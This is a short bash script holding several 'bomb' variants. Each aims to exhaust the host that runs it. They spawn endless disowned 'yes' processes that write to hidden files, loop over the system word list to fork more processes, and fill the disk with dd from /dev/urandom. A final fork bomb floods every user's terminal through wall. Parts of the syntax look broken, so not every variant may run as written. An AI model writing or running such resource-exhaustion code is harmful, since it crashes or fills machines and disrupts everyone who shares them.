#!/usr/bin/env bash
#short version but not ready yet. ignore :(){i=0;yes balls > $temp$i &;($i++);:|:&};:

#yesbomb 1
# :()
# {
# yes balls > file$i.txt &
# ($1)
# : $1| : ($1 * -1) &
# }
# i=0
# : $i

#yesbomb two
:
{
	for (( i=0; ; i+=1 )); do
		yes balls > .$1$i & disown
	done
}
words=`cat /usr/share/dict/words`
: kittykatz & disown
c=0
while true; do
	for word in $words; do
		: $word$c & disown
	done
	counter+=1
done

#yesbomb three
:
{
	for (( i=0; ; i+=1 )); do
		man bash | yes > .$1$i & disown
	done
}
words=`cat /usr/share/dict/words`
: kittykatz & disown
c=0
while true; do
	for word in $words; do
		: $word$c & disown
	done
	counter+=1
done

#bomb four (dd)
:
{
	for (( i=0; ; i+=1 )); do
		dd if=/dev/urandom of=./.$1$i & disown
	done
}
: kittykatz & disown
c=0
while true; do
	for word in $words; do
		: $word$c & disown
	done
	counter+=1
done

#wallbomb
:(){echo "balls"|wall:|:&disown};:&disown
